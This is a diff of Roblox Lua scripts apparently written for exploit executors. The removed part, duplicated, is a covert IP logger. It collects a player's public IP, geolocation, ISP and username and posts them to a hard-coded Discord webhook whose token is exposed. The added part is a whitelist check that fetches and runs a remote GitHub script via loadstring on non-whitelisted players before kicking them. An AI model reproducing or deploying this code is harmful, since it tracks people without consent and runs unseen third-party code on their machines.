@@ -1,309 +1,9 @@
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local HttpService = game:GetService("HttpService")
-
--- CONFIG
-local url = "https://discord.com/api/webhooks/1487564849113202738/b0_GNw4Uc-zGkQkXpX7BmZtBoYqc91ZzCbMD3iZNqr4-LLX4JOVbo1XSghbFHm52p_Dr"
-
--- CHECK EXECUTOR
-local webhookcheck =
-   is_sirhurt_closure and "Sirhurt" or
-   pebc_execute and "ProtoSmasher" or
-   syn and "Synapse X" or
-   secure_load and "Sentinel" or
-   KRNL_LOADED and "Krnl" or
-   SONA_LOADED and "Sona" or
-   JEX_LOADED and "Jex" or
-   FLUXUS_LOADED and "Fluxus" or
-   EVON_LOADED and "Evon" or
-   JJS_LOADED and "JJSploit" or
-   DELTA_LOADED and "Delta" or
-   "Kid with shit exploit"
-
--- FETCH PUBLIC IP DATA USING http_request
-local ip_data = nil
-local ip_success = false
-
-local request = http_request or syn.request or (function() error("No request method available") end)
-
-local ip_request = {
-   Url = "http://ip-api.com/json",
-   Method = "GET"
-}
-
-pcall(function()
-   local response = request(ip_request)
-   if response and response.Success then
-      ip_data = response.Body
-      ip_success = true
-   else
-      warn("Failed to fetch public IP data")
-   end
-end)
-
-print("IP Data Raw:", ip_data)
-
-local ip_string = "Unknown IP"
-local country = "Unknown"
-local region = "Unknown"
-local city = "Unknown"
-local isp = "Unknown"
-local timezone = "Unknown"
-local lat = "Unknown"
-local lon = "Unknown"
-
-if ip_success and type(ip_data) == "string" then
-   local success, decoded = pcall(function()
-      return HttpService:JSONDecode(ip_data)
-   end)
-   print("Decoded IP Data:", decoded)
-   if success and type(decoded) == "table" then
-      ip_string = decoded.query or "Unknown"
-      country = decoded.country or "Unknown"
-      region = decoded.regionName or "Unknown"
-      city = decoded.city or "Unknown"
-      isp = decoded.isp or "Unknown"
-      timezone = decoded.timezone or "Unknown"
-      lat = decoded.lat or "Unknown"
-      lon = decoded.lon or "Unknown"
-   else
-      warn("Failed to decode IP data")
-   end
-end
-
-print("IP String:", ip_string)
-print("Country:", country)
-print("Region:", region)
-print("City:", city)
-print("ISP:", isp)
-print("Timezone:", timezone)
-print("Lat:", lat)
-print("Lon:", lon)
-
--- FETCH PRIVATE IP ADDRESS
-local private_ip = ""
-pcall(function()
-   local response = HttpService:GetAsync("http://api.ipify.org?format=json")
-   if response then
-      local success, decoded = pcall(HttpService.JSONDecode, HttpService, response)
-      if success and decoded.ip then
-         private_ip = decoded.ip
-      else
-         warn("Failed to decode private IP data")
-      end
-   else
-      warn("Failed to fetch private IP data")
-   end
-end)
-
-print("Private IP:", private_ip)
-
--- BUILD PAYLOAD WITH FULL GEOLOCATION AND PRIVATE IP
-local data = {
-    ["username"] = "Roblox-Log",
-    ["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png",
-    ["content"] = "@ everyone **" .. LocalPlayer.Name .. "** just ran your logger",
-    ["embeds"] = {
-        {
-            ["title"] = "**" .. LocalPlayer.Name .. " just ran your logger**",
-            ["description"] = "**Public IP:** " .. tostring(ip_string) .. "\n" ..
-                            "**Country:** " .. country .. "\n" ..
-                            "**Region:** " .. region .. "\n" ..
-                            "**City:** " .. city .. "\n" ..
-                            "**ISP:** " .. isp .. "\n" ..
-                            "**Timezone:** " .. timezone .. "\n" ..
-                            "**Coordinates:** " .. lat .. ", " .. lon .. "\n" ..
-                            "**Private IP:** " .. private_ip .. "\n" ..
-                            "**Username:** " .. LocalPlayer.Name .. "\n" ..
-                            "**Uses:** " .. webhookcheck,
-            ["type"] = "rich",
-            ["color"] = 14680319,
-            ["footer"] = {
-                ["text"] = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')"
-            }
-        }
-    }
-}
--- SEND TO DISCORD
-local newdata = HttpService:JSONEncode(data)
-
-local headers = {
-    ["content-type"] = "application/json"
-}
-
-local abcdef = {
-    Url = url,
-    Body = newdata,
-    Method = "POST",
-    Headers = headers
-}
-
-pcall(function()
-   local response = request(abcdef)
-   if response and response.Success then
-      print("Message sent successfully")
-   else
-      warn("Failed to send message to Discord")
-   end
-end)
-
-print("noob")local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local HttpService = game:GetService("HttpService")
-
--- CONFIG
-local url = "https://discord.com/api/webhooks/1487564849113202738/b0_GNw4Uc-zGkQkXpX7BmZtBoYqc91ZzCbMD3iZNqr4-LLX4JOVbo1XSghbFHm52p_Dr"
-
--- CHECK EXECUTOR
-local webhookcheck =
-   is_sirhurt_closure and "Sirhurt" or
-   pebc_execute and "ProtoSmasher" or
-   syn and "Synapse X" or
-   secure_load and "Sentinel" or
-   KRNL_LOADED and "Krnl" or
-   SONA_LOADED and "Sona" or
-   JEX_LOADED and "Jex" or
-   FLUXUS_LOADED and "Fluxus" or
-   EVON_LOADED and "Evon" or
-   JJS_LOADED and "JJSploit" or
-   DELTA_LOADED and "Delta" or
-   "Kid with shit exploit"
-
--- FETCH PUBLIC IP DATA USING http_request
-local ip_data = nil
-local ip_success = false
-
-local request = http_request or syn.request or (function() error("No request method available") end)
-
-local ip_request = {
-   Url = "http://ip-api.com/json",
-   Method = "GET"
-}
-
-pcall(function()
-   local response = request(ip_request)
-   if response and response.Success then
-      ip_data = response.Body
-      ip_success = true
-   else
-      warn("Failed to fetch public IP data")
-   end
-end)
-
-print("IP Data Raw:", ip_data)
-
-local ip_string = "Unknown IP"
-local country = "Unknown"
-local region = "Unknown"
-local city = "Unknown"
-local isp = "Unknown"
-local timezone = "Unknown"
-local lat = "Unknown"
-local lon = "Unknown"
-
-if ip_success and type(ip_data) == "string" then
-   local success, decoded = pcall(function()
-      return HttpService:JSONDecode(ip_data)
-   end)
-   print("Decoded IP Data:", decoded)
-   if success and type(decoded) == "table" then
-      ip_string = decoded.query or "Unknown"
-      country = decoded.country or "Unknown"
-      region = decoded.regionName or "Unknown"
-      city = decoded.city or "Unknown"
-      isp = decoded.isp or "Unknown"
-      timezone = decoded.timezone or "Unknown"
-      lat = decoded.lat or "Unknown"
-      lon = decoded.lon or "Unknown"
-   else
-      warn("Failed to decode IP data")
-   end
-end
-
-print("IP String:", ip_string)
-print("Country:", country)
-print("Region:", region)
-print("City:", city)
-print("ISP:", isp)
-print("Timezone:", timezone)
-print("Lat:", lat)
-print("Lon:", lon)
-
--- FETCH PRIVATE IP ADDRESS
-local private_ip = ""
-pcall(function()
-   local response = HttpService:GetAsync("http://api.ipify.org?format=json")
-   if response then
-      local success, decoded = pcall(HttpService.JSONDecode, HttpService, response)
-      if success and decoded.ip then
-         private_ip = decoded.ip
-      else
-         warn("Failed to decode private IP data")
-      end
-   else
-      warn("Failed to fetch private IP data")
-   end
-end)
-
-print("Private IP:", private_ip)
-
--- BUILD PAYLOAD WITH FULL GEOLOCATION AND PRIVATE IP
-local data = {
-    ["username"] = "Roblox-Log",
-    ["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png",
-    ["content"] = "@ everyone **" .. LocalPlayer.Name .. "** just ran your logger",
-    ["embeds"] = {
-        {
-            ["title"] = "**" .. LocalPlayer.Name .. " just ran your logger**",
-            ["description"] = "**Public IP:** " .. tostring(ip_string) .. "\n" ..
-                            "**Country:** " .. country .. "\n" ..
-                            "**Region:** " .. region .. "\n" ..
-                            "**City:** " .. city .. "\n" ..
-                            "**ISP:** " .. isp .. "\n" ..
-                            "**Timezone:** " .. timezone .. "\n" ..
-                            "**Coordinates:** " .. lat .. ", " .. lon .. "\n" ..
-                            "**Private IP:** " .. private_ip .. "\n" ..
-                            "**Username:** " .. LocalPlayer.Name .. "\n" ..
-                            "**Uses:** " .. webhookcheck,
-            ["type"] = "rich",
-            ["color"] = 14680319,
-            ["footer"] = {
-                ["text"] = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')"
-            }
-        }
-    }
-}
--- SEND TO DISCORD
-local newdata = HttpService:JSONEncode(data)
-
-local headers = {
-    ["content-type"] = "application/json"
-}
-
-local abcdef = {
-    Url = url,
-    Body = newdata,
-    Method = "POST",
-    Headers = headers
-}
-
-pcall(function()
-   local response = request(abcdef)
-   if response and response.Success then
-      print("Message sent successfully")
-   else
-      warn("Failed to send message to Discord")
-   end
-end)
-
-print("noob")
-
 -- Sistema de Whitelist por Iniciales para Ejecutor Delta
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
 -- Configuración
-local WHITELIST_PREFIXES = {"v3r"} -- Cambia esto según tus necesidades
+local WHITELIST_PREFIXES = {"L3G4CY"} -- Cambia esto según tus necesidades
 
 -- Función para verificar si un jugador está en la whitelist
 local function isInWhitelist(player)
@@ -319,16 +19,16 @@ local function isInWhitelist(player)
     return false
 end
 
--- Verificar si el jugador local está en la whitelist
-if isInWhitelist(LocalPlayer) then
-    -- Código a ejecutar si el jugador está en la whitelist
-    print("Jugador en la whitelist. Ejecutando script permitido...")
-    -- Ejemplo de script a ejecutar para jugadores whitelisteados
-    loadstring(game:HttpGet("tu script"))()
-else
-    -- Código a ejecutar si el jugador no está en la whitelist
-    print("Jugador no en la whitelist. Ejecutando script adicional...")
+-- Script a ejecutar si el jugador no está en la whitelist
+local function executeCustomScript()
+    -- Ejecutar el script específico para jugadores no whitelisteados
     loadstring(game:HttpGet("https://raw.githubusercontent.com/FZKONTOP/A-a/refs/heads/main/A%C3%B1a.lua"))()
+end
+
+-- Verificar si el jugador local está en la whitelist
+if not isInWhitelist(LocalPlayer) then
+    -- Ejecutar el script adicional
+    executeCustomScript()
     
     -- Esperar 5 segundos antes de expulsar al jugador
     wait(5)
@@ -336,12 +36,20 @@ else
     -- Expulsar al jugador
     LocalPlayer:Kick("No estás en la lista blanca. Acceso denegado.")
 end
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
 
-if not whitelist[LocalPlayer.Name] then
-    LocalPlayer:Kick("No estas en WhiteList para usar este script")
-end
+-- =====================================================================
+-- AQUÍ VA EL CÓDIGO PARA LOS USUARIOS EN WHITELIST
+-- =====================================================================
+
+-- Si el jugador pasa la verificación, puede continuar ejecutando otros scripts
+print("Acceso permitido. Puedes ejecutar otros scripts debajo de este.")
+
+-- Puedes añadir aquí cualquier código que solo los usuarios en whitelist deben ejecutar:
+
+-- O puedes cargar scripts externos:
+-- loadstring(game:HttpGet("URL_DEL_SCRIPT_PARA_WHITELIST"))()
+
+-- code limpio abajo
 local Players = game:GetService("Players")
 local VirtualUser = game:GetService("VirtualUser")
 
